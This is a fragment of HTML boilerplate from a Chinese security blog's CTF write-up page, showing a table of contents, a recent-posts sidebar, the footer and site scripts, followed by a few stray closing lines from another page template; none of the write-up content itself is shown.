class="toc-number">2.</span> <span class="toc-text">0x01：SMTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%EF%BC%9A%E6%8D%89%E8%BF%B7%E8%97%8F"><span class="toc-number">3.</span> <span class="toc-text">0x02：捉迷藏</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%EF%BC%9Aret2libc-aarch64"><span class="toc-number">4.</span> <span class="toc-text">0x03：ret2libc_aarch64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04%EF%BC%9A%E9%A2%98%E7%9B%AE%E9%99%84%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">0x04：题目附件</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/10/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞"><img src="/img/fen/wen09.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串漏洞"/></a><div class="content"><a class="title" href="/2022/10/30/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞">格式化字符串漏洞</a><time datetime="2022-10-30T13:30:33.000Z" title="发表于 2022-10-30 21:30:33">2022-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/16/%E5%85%B3%E4%BA%8Emalloc%E6%BA%90%E7%A0%81%E4%B8%ADbin-at%E5%AE%8F%E5%AE%9A%E4%B9%89%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/" title="关于malloc源码中bin_at宏定义的个人见解"><img src="/img/fen/wen08.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="关于malloc源码中bin_at宏定义的个人见解"/></a><div class="content"><a class="title" href="/2022/10/16/%E5%85%B3%E4%BA%8Emalloc%E6%BA%90%E7%A0%81%E4%B8%ADbin-at%E5%AE%8F%E5%AE%9A%E4%B9%89%E7%9A%84%E4%B8%AA%E4%BA%BA%E8%A7%81%E8%A7%A3/" title="关于malloc源码中bin_at宏定义的个人见解">关于malloc源码中bin_at宏定义的个人见解</a><time datetime="2022-10-16T02:26:50.000Z" title="发表于 2022-10-16 10:26:50">2022-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/16/Angr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="Angr学习记录"><img src="/img/fen/wen07.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Angr学习记录"/></a><div class="content"><a class="title" href="/2022/10/16/Angr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" title="Angr学习记录">Angr学习记录</a><time datetime="2022-10-16T00:34:32.000Z" title="发表于 2022-10-16 08:34:32">2022-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/15/Base64%E9%9A%90%E5%86%99/" title="Base64隐写"><img src="/img/fen/wen06.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Base64隐写"/></a><div class="content"><a class="title" href="/2022/10/15/Base64%E9%9A%90%E5%86%99/" title="Base64隐写">Base64隐写</a><time datetime="2022-10-15T01:14:05.000Z" title="发表于 2022-10-15 09:14:05">2022-10-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/12/%E6%9B%B4%E6%8D%A2%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6glibc%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E4%B8%80%E6%AC%A1%E6%8C%A3%E6%89%8E/" title="更换可执行文件glibc版本的某一次挣扎"><img src="/img/fen/wen05.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="更换可执行文件glibc版本的某一次挣扎"/></a><div class="content"><a class="title" href="/2022/10/12/%E6%9B%B4%E6%8D%A2%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6glibc%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E4%B8%80%E6%AC%A1%E6%8C%A3%E6%89%8E/" title="更换可执行文件glibc版本的某一次挣扎">更换可执行文件glibc版本的某一次挣扎</a><time datetime="2022-10-12T00:36:20.000Z" title="发表于 2022-10-12 08:36:20">2022-10-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By tolele</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', '');</script></html>
